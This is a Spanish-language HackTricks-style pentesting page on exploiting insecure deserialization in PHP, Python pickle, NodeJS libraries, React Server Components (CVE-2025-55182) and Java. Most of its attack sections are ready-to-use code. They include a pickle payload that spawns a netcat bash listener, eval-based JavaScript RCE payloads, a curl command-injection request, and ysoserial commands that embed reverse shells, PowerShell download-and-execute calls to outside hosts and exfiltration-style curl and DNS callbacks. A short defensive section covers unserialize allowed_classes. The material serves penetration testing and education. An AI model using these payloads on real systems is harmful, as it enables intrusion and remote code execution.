# Deserialization

{{#include ../../banners/hacktricks-training.md}}

## Información básica

**Serialization** se entiende como el método de convertir un objeto en un formato que puede ser preservado, con la intención de almacenar el objeto o transmitirlo como parte de un proceso de comunicación. Esta técnica se emplea comúnmente para asegurar que el objeto pueda ser recreado más tarde, manteniendo su estructura y estado.

**Deserialization**, por el contrario, es el proceso que contrarresta la serialization. Implica tomar datos que han sido estructurados en un formato específico y reconstruirlos nuevamente en un objeto.

Deserialization puede ser peligrosa porque potencialmente **permite a los atacantes manipular los datos serializados para ejecutar código dañino** o causar comportamientos inesperados en la aplicación durante el proceso de reconstrucción del objeto.

## PHP

En PHP, se utilizan métodos mágicos específicos durante los procesos de serialization y deserialization:

- `__sleep`: Se invoca cuando un objeto está siendo serializado. Este método debe devolver un array con los nombres de todas las propiedades del objeto que deben ser serializadas. Se usa comúnmente para confirmar datos pendientes o realizar tareas de limpieza similares.
- `__wakeup`: Se llama cuando un objeto está siendo deserializado. Se utiliza para restablecer cualquier conexión a bases de datos que pueda haberse perdido durante la serialización y realizar otras tareas de reinicialización.
- `__unserialize`: Este método se llama en lugar de `__wakeup` (si existe) cuando un objeto está siendo deserializado. Brinda un mayor control sobre el proceso de deserialización en comparación con `__wakeup`.
- `__destruct`: Este método se llama cuando un objeto está a punto de ser destruido o cuando finaliza el script. Normalmente se usa para tareas de limpieza, como cerrar manejadores de archivos o conexiones a bases de datos.
- `__toString`: Este método permite que un objeto sea tratado como una cadena. Puede usarse para leer un archivo u otras tareas basadas en las llamadas a funciones dentro de él, proporcionando efectivamente una representación textual del objeto.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Si observas los resultados puedes ver que las funciones **`__wakeup`** y **`__destruct`** se llaman cuando el objeto es deserializado. Ten en cuenta que en varios tutoriales encontrarás que la función **`__toString`** se llama al intentar imprimir algún atributo, pero aparentemente eso **ya no ocurre**.

> [!WARNING]
> El método **`__unserialize(array $data)`** se llama **en lugar de `__wakeup()`** si está implementado en la clase. Permite deserializar el objeto proporcionando los datos serializados como un array. Puedes usar este método para deserializar propiedades y realizar cualquier tarea necesaria al deserializar.
>
> ```php
> class MyClass {
>    private $property;
>
>    public function __unserialize(array $data): void {
>        $this->property = $data['property'];
>        // Perform any necessary tasks upon deserialization.
>    }
> }
> ```

Puedes leer un ejemplo explicado de **PHP aquí**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), aquí [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) o aquí [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

Podrías abusar de la funcionalidad autoload de PHP para cargar archivos php arbitrarios y más:


{{#ref}}
php-deserialization-+-autoload-classes.md
{{#endref}}

### Serializing Referenced Values

Si por alguna razón quieres serializar un valor como una **referencia a otro valor serializado** puedes:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### Previniendo PHP Object Injection con `allowed_classes`

> [!INFO]
> El soporte para el **segundo argumento** de `unserialize()` (el array `$options`) se añadió en **PHP 7.0**. En versiones antiguas la función sólo acepta la cadena serializada, lo que hace imposible restringir qué clases pueden ser instanciadas.

`unserialize()` instanciará **todas las clases** que encuentre dentro de la cadena serializada, a menos que se le indique lo contrario. Desde **PHP 7** el comportamiento puede restringirse con la opción [`allowed_classes`](https://www.php.net/manual/en/function.unserialize.php):
```php
// NEVER DO THIS – full object instantiation
$object = unserialize($userControlledData);

// SAFER – disable object instantiation completely
$object = unserialize($userControlledData, [
'allowed_classes' => false    // no classes may be created
]);

// Granular – only allow a strict white-list of models
$object = unserialize($userControlledData, [
'allowed_classes' => [MyModel::class, DateTime::class]
]);
```
Si **`allowed_classes` se omite _o_ el código se ejecuta en PHP < 7.0**, la llamada se vuelve **peligrosa** ya que un atacante puede crear una carga útil que abuse de métodos mágicos como `__wakeup()` o `__destruct()` para lograr Remote Code Execution (RCE).

#### Ejemplo del mundo real: Everest Forms (WordPress) CVE-2025-52709

El plugin de WordPress **Everest Forms ≤ 3.2.2** intentó ser defensivo con un envoltorio auxiliar pero se olvidó de las versiones antiguas de PHP:
```php
function evf_maybe_unserialize($data, $options = array()) {
if (is_serialized($data)) {
if (version_compare(PHP_VERSION, '7.1.0', '>=')) {
// SAFE branch (PHP ≥ 7.1)
$options = wp_parse_args($options, array('allowed_classes' => false));
return @unserialize(trim($data), $options);
}
// DANGEROUS branch (PHP < 7.1)
return @unserialize(trim($data));
}
return $data;
}
```
En servidores que aún ejecutaban **PHP ≤ 7.0** esta segunda rama condujo a un clásico **PHP Object Injection** cuando un administrador abrió un envío de formulario malicioso. Un exploit payload mínimo podría verse así:
```
O:8:"SomeClass":1:{s:8:"property";s:28:"<?php system($_GET['cmd']); ?>";}
```
Tan pronto como el admin vio la entrada, el objeto fue instanciado y `SomeClass::__destruct()` se ejecutó, resultando en ejecución de código arbitrario.

**Puntos clave**
1. Siempre pasa `['allowed_classes' => false]` (o una white-list estricta) al llamar a `unserialize()`.
2. Audita los defensive wrappers – a menudo se olvidan de las ramas legacy de PHP.
3. Actualizar a **PHP ≥ 7.x** por sí solo no es suficiente: la opción aún debe suministrarse explícitamente.

---

### PHPGGC (ysoserial for PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) puede ayudarte a generar payloads para abusar de PHP deserializations.\
Ten en cuenta que en varios casos **no podrás encontrar una forma de abusar de una deserialization en el código fuente** de la aplicación, pero podrías **abusar del código de extensiones PHP externas.**\
Así que, si puedes, revisa el `phpinfo()` del servidor y **búsca en Internet** (incluso en los **gadgets** de **PHPGGC**) algún gadget posible que puedas abusar.

### phar:// metadata deserialization

Si has encontrado un LFI que simplemente lee el archivo y no ejecuta el código php dentro de él, por ejemplo usando funciones como _**file_get_contents(), fopen(), file() or file_exists(), md5_file(), filemtime() or filesize()**_**.** Puedes intentar abusar de una **deserialization** que ocurre al **leer** un **archivo** usando el protocolo **phar**.\
Para más información lee el siguiente post:


{{#ref}}
../file-inclusion/phar-deserialization.md
{{#endref}}

## Python

### **Pickle**

Cuando el objeto se unpickle, la función \_\_\_reduce\_\_\_ se ejecutará.\
Si se explota, el servidor podría devolver un error.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Antes de comprobar la técnica de bypass, intenta usar `print(base64.b64encode(pickle.dumps(P(),2)))` para generar un objeto compatible con python2 si estás ejecutando python3.

Para más información sobre cómo escapar de las **pickle jails** consulta:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

### Yaml **&** jsonpickle

La siguiente página presenta la técnica para **abusar de una deserialización insegura en las librerías yaml de Python** y finaliza con una herramienta que puede usarse para generar payloads de deserialización RCE para **Pickle, PyYAML, jsonpickle y ruamel.yaml**:


{{#ref}}
python-yaml-deserialization.md
{{#endref}}

### Class Pollution (Python Prototype Pollution)


{{#ref}}
../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md
{{#endref}}

## NodeJS

### JS Magic Functions

JS **doesn't have "magic" functions** like PHP or Python that are going to be executed just for creating an object. But it has some **functions** that are **frequently used even without directly calling them** such as **`toString`**, **`valueOf`**, **`toJSON`**.\
If abusing a deserialization you can **compromise these functions to execute other code** (potentially abusing prototype pollutions) you could execute arbitrary code when they are called.

Another **"magic" way to call a function** without calling it directly is by **compromising an object that is returned by an async function** (promise). Because, if you **transform** that **return object** in another **promise** with a **property** called **"then" of type function**, it will be **executed** just because it's returned by another promise. _Sigue_ [_**este enlace**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _para más info._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise((resolve) => {
console.log("hello")
resolve()
})
return p
}

async function test_then() {
const p = new Promise((then) => {
console.log("hello")
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` and `prototype` pollution

Si quieres aprender sobre esta técnica **echa un vistazo al siguiente tutorial**:


{{#ref}}
nodejs-proto-prototype-pollution/
{{#endref}}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Esta librería permite serializar funciones. Ejemplo:
```javascript
var y = {
rce: function () {
require("child_process").exec("ls /", function (error, stdout, stderr) {
console.log(stdout)
})
},
}
var serialize = require("node-serialize")
var payload_serialized = serialize.serialize(y)
console.log("Serialized: \n" + payload_serialized)
```
El **objeto serializado** se verá así:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Puedes ver en el ejemplo que cuando una función se serializa se añade la bandera `_$$ND_FUNC$$_` al objeto serializado.

Inside the file `node-serialize/lib/serialize.js` you can find the same flag and how the code is using it.

![](<../../images/image (351).png>)

![](<../../images/image (446).png>)

Como puedes ver en el último fragmento de código, **si se encuentra la bandera** se usa `eval` para deserializar la función, así que básicamente **la entrada del usuario está siendo usada dentro de la función `eval`**.

Sin embargo, **solo serializar** una función **no la ejecutará** ya que sería necesario que alguna parte del código **llame a `y.rce`** en nuestro ejemplo y eso es muy **improbable**.\\
De todos modos, podrías simplemente **modificar el objeto serializado** **añadiendo algunos paréntesis** para ejecutar automáticamente la función serializada cuando el objeto sea deserializado.\\
En el siguiente fragmento de código **fíjate en el último paréntesis** y en cómo la función `unserialize` ejecutará automáticamente el código:
```javascript
var serialize = require("node-serialize")
var test = {
rce: "_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()",
}
serialize.unserialize(test)
```
Como se indicó anteriormente, esta biblioteca obtendrá el código después de `_$$ND_FUNC$$_` y lo **ejecutará** usando `eval`. Por lo tanto, para **ejecutar el código automáticamente** puedes **eliminar la parte de creación de la función** y el último paréntesis y **simplemente ejecutar un JS oneliner** como en el siguiente ejemplo:
```javascript
var serialize = require("node-serialize")
var test =
"{\"rce\":\"_$$ND_FUNC$$_require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })\"}"
serialize.unserialize(test)
```
Puedes [**find here**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **más información** sobre cómo explotar esta vulnerabilidad.

### [funcster](https://www.npmjs.com/package/funcster)

Un aspecto notable de **funcster** es la inaccesibilidad de los **objetos integrados estándar**; quedan fuera del alcance accesible. Esta restricción impide la ejecución de código que intenta invocar métodos en objetos integrados, provocando excepciones como `"ReferenceError: console is not defined"` cuando se usan comandos como `console.log()` o `require(something)`.

A pesar de esta limitación, la restauración del acceso completo al contexto global, incluidos todos los objetos integrados estándar, es posible mediante un enfoque específico. Al aprovechar directamente el contexto global, se puede eludir esta restricción. Por ejemplo, el acceso puede restablecerse usando el siguiente fragmento de código:
```javascript
funcster = require("funcster")
//Serialization
var test = funcster.serialize(function () {
return "Hello world!"
})
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = {
__js_function: 'this.constructor.constructor("console.log(1111)")()',
}
funcster.deepDeserialize(desertest2)
var desertest3 = {
__js_function:
"this.constructor.constructor(\"require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\")()",
}
funcster.deepDeserialize(desertest3)
```
**Para**[ **más información lea esta fuente**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

El paquete **serialize-javascript** está diseñado exclusivamente para fines de serialization y carece de capacidades de deserialization integradas. Los usuarios son responsables de implementar su propio método para deserialization. El ejemplo oficial sugiere el uso directo de `eval` para deserializing serialized data:
```javascript
function deserialize(serializedJavascript) {
return eval("(" + serializedJavascript + ")")
}
```
Si esta función se usa para deserializar objetos puedes **explotarla fácilmente**:
```javascript
var serialize = require("serialize-javascript")
//Serialization
var test = serialize(function () {
return "Hello world!"
})
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test =
"function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Para**[ **más información lee esta fuente**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo library

En las páginas siguientes puedes encontrar información sobre cómo abusar de esta biblioteca para ejecutar comandos arbitrarios:

- [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
- [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

### React Server Components / react-server-dom-webpack Server Actions Abuse (CVE-2025-55182)

React Server Components (RSC) dependen de `react-server-dom-webpack` (RSDW) para decodificar los server action submissions que se envían como `multipart/form-data`. 

Cada envío de server action contiene:

- `$ACTION_REF_<n>` partes que hacen referencia a la action que se invoca.
- `$ACTION_<n>:<m>` partes cuyo cuerpo es JSON, por ejemplo `{"id":"module-path#export","bound":[arg0,arg1,...]}`.

En la versión **19.2.0** la helper `decodeAction(formData, serverManifest)` confía ciegamente tanto en la **cadena `id`** (que selecciona qué export del módulo llamar) como en la **matriz `bound`** (los argumentos). Si un atacante puede alcanzar el endpoint que reenvía requests a `decodeAction`, puede invocar cualquier server action exportada con parámetros controlados por el atacante incluso sin un front-end de React (CVE-2025-55182). La receta de extremo a extremo es:

1. **Learn the action identifier.** Bundle output, error traces or leaked manifests typically reveal strings like `app/server-actions#generateReport`.
2. **Recreate the multipart payload.** Recrea la carga útil multipart. Crea una parte `$ACTION_REF_0` y un cuerpo JSON `$ACTION_0:0` que lleve el identificador y argumentos arbitrarios.
3. **Let `decodeAction` dispatch it.** El helper resuelve el módulo desde `serverManifest`, importa la export y devuelve un callable que el servidor ejecuta inmediatamente.

Example payload hitting `/formaction`:
```http
POST /formaction HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----BOUNDARY

------BOUNDARY
Content-Disposition: form-data; name="$ACTION_REF_0"

------BOUNDARY
Content-Disposition: form-data; name="$ACTION_0:0"

{"id":"app/server-actions#generateReport","bound":["acme","pdf & whoami"]}
------BOUNDARY--
```
O con curl:
```bash
curl -sk -X POST http://target/formaction \
-F '$ACTION_REF_0=' \
-F '$ACTION_0:0={"id":"app/server-actions#generateReport","bound":["acme","pdf & whoami"]}'
```
El array `bound` llena directamente los parámetros de server-action. En el laboratorio vulnerable, el gadget se ve así:
```javascript
const { exec } = require("child_process");
const util = require("util");
const pexec = util.promisify(exec);

async function generateReport(project, format) {
const cmd = `node ./scripts/report.js --project=${project} --format=${format}`;
const { stdout } = await pexec(cmd);
return stdout;
}
```
Proporcionar `format = "pdf & whoami"` hace que `/bin/sh -c` ejecute el generador de informes legítimo y luego `whoami`, con ambas salidas entregadas dentro de la respuesta JSON de la acción. Cualquier server action que envuelva primitivas del sistema de archivos, drivers de base de datos u otros intérpretes puede ser abusada de la misma manera una vez que el atacante controle los datos `bound`.

Un atacante nunca necesita un cliente React real—cualquier herramienta HTTP que emita la forma multipart `$ACTION_*` puede llamar directamente a server actions y encadenar la salida JSON resultante en un primitivo RCE.

## Java - HTTP

En Java, **deserialization callbacks are executed during the process of deserialization**. Esta ejecución puede ser explotada por atacantes que elaboren payloads maliciosos que activen estos callbacks, conduciendo a la posible ejecución de acciones dañinas.

### Indicadores

#### Caja blanca

Para identificar posibles vulnerabilidades de serialización en la base de código, busca:

- Clases que implementen la interfaz `Serializable`.
- Uso de `java.io.ObjectInputStream`, las funciones `readObject`, `readUnshare`.

Presta especial atención a:

- `XMLDecoder` utilizado con parámetros definidos por usuarios externos.
- El método `fromXML` de `XStream`, especialmente si la versión de XStream es menor o igual a 1.46, ya que es susceptible a problemas de serialización.
- `ObjectInputStream` combinado con el método `readObject`.
- Implementación de métodos como `readObject`, `readObjectNodData`, `readResolve`, o `readExternal`.
- `ObjectInputStream.readUnshared`.
- Uso general de `Serializable`.

#### Caja negra

Para pruebas de caja negra, busca **firmas o "Magic Bytes"** específicas que indiquen objetos serializados de Java (originados por `ObjectInputStream`):

- Patrón hexadecimal: `AC ED 00 05`.
- Patrón Base64: `rO0`.
- Encabezados de respuesta HTTP con `Content-type` establecido en `application/x-java-serialized-object`.
- Patrón hexadecimal que indica compresión previa: `1F 8B 08 00`.
- Patrón Base64 que indica compresión previa: `H4sIA`.
- Archivos web con la extensión `.faces` y el parámetro `faces.ViewState`. Descubrir estos patrones en una aplicación web debe llevar a un examen como el detallado en el [post about Java JSF ViewState Deserialization](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Comprobar si es vulnerable

Si quieres **learn about how does a Java Deserialized exploit work** deberías echar un vistazo a [**Basic Java Deserialization**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Deserialization**](java-dns-deserialization-and-gadgetprobe.md), y [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md).

#### SignedObject-gated deserialization y alcance pre-auth

Las bases de código modernas a veces envuelven la deserialización con `java.security.SignedObject` y validan una firma antes de llamar a `getObject()` (que deserializa el objeto interno). Esto previene arbitrary top-level gadget classes pero aún puede ser explotable si un atacante puede obtener una firma válida (por ejemplo, private-key compromise o un signing oracle). Además, los flujos de manejo de errores pueden emitir session-bound tokens para usuarios no autenticados, exponiendo sinks protegidos pre-auth.

Para un estudio de caso concreto con requests, IoCs y recomendaciones de hardening, consulta:

{{#ref}}
java-signedobject-gated-deserialization.md
{{#endref}}

#### White Box Test

Puedes comprobar si hay alguna aplicación instalada con vulnerabilidades conocidas.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Puedes intentar **comprobar todas las librerías** conocidas por ser vulnerables y para las que [**Ysoserial** ](https://github.com/frohoff/ysoserial) puede proporcionar un exploit. O puedes revisar las librerías indicadas en [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
También puedes usar [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) para buscar posibles gadget chains que puedan explotarse.\
Al ejecutar **gadgetinspector** (después de compilarlo) no te preocupes por la gran cantidad de warnings/errors por los que pasará y déjalo terminar. Escribirá todos los hallazgos en _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_. Ten en cuenta que **gadgetinspector won't create an exploit and it may indicate false positives**.

#### Black Box Test

Usando la extensión de Burp [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) puedes identificar **qué librerías están disponibles** (e incluso las versiones). Con esta información podría ser **más fácil elegir un payload** para explotar la vulnerabilidad.\
[**Read this to learn more about GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe está centrado en las deserializaciones de **`ObjectInputStream`**.

Usando la extensión de Burp [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) puedes **identificar librerías vulnerables** explotables con ysoserial y **explotarlas**.\
[**Read this to learn more about Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner está centrado en deserializaciones **`ObjectInputStream`**.

También puedes usar [**Freddy**](https://github.com/nccgroup/freddy) para **detectar vulnerabilidades de deserialización** en **Burp**. Este plugin detectará **no solo vulnerabilidades relacionadas con `ObjectInputStream`** sino **también** fallos en librerías de deserialización **Json** y **Yml**. En modo activo intentará confirmarlas usando payloads de sleep o DNS.\
[**You can find more information about Freddy here.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Serialization Test**

No todo consiste en comprobar si el servidor usa alguna librería vulnerable. A veces puedes **modificar los datos dentro del objeto serializado y eludir algunas comprobaciones** (quizá te conceda privilegios de admin dentro de una webapp).\
Si localizas un objeto Java serializado que se envía a una aplicación web, **puedes usar** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **para imprimir el objeto serializado que se envía en un formato más legible**. Saber qué datos estás enviando hará más fácil modificarlos y eludir algunas comprobaciones.

### **Exploit**

#### **ysoserial**

La herramienta principal para explotar deserializaciones Java es [**ysoserial**](https://github.com/frohoff/ysoserial) ([**download here**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). También puedes considerar usar [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified), que te permitirá usar comandos complejos (con pipes, por ejemplo).\
Ten en cuenta que esta herramienta está **enfocada** en explotar **`ObjectInputStream`**.\
Recomendaría **empezar usando el payload "URLDNS"** antes de un payload **RCE** para probar si la inyección es posible. De todos modos, ten en cuenta que puede que el payload "URLDNS" no funcione pero otro payload RCE sí.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Al crear un payload para **java.lang.Runtime.exec()** no puedes usar caracteres especiales como ">" o "|" para redirigir la salida de una ejecución, "$()" para ejecutar comandos o siquiera **pasar argumentos** a un comando separados por **espacios** (puedes hacer `echo -n "hello world"` pero no puedes hacer `python2 -c 'print "Hello world"'`). Para codificar correctamente el payload puedes [usar esta página web](http://www.jackson-t.ca/runtime-exec-payloads.html).

Siéntete libre de usar el siguiente script para crear **todos los posibles payloads de ejecución de código** para Windows y Linux y luego probarlos en la página web vulnerable:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Puedes **usar** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **junto con ysoserial para crear más exploits**. Más información sobre esta herramienta en las **diapositivas de la charla** donde se presentó la herramienta: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec) puede usarse para generar payloads para explotar diferentes bibliotecas de serialización **Json** y **Yml** en Java.\
Para compilar el proyecto necesitaba **añadir** estas **dependencias** a `pom.xml`:
```html
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Instalar maven**, y **compilar** el proyecto:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Lee más sobre esta biblioteca Java JSON: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labs

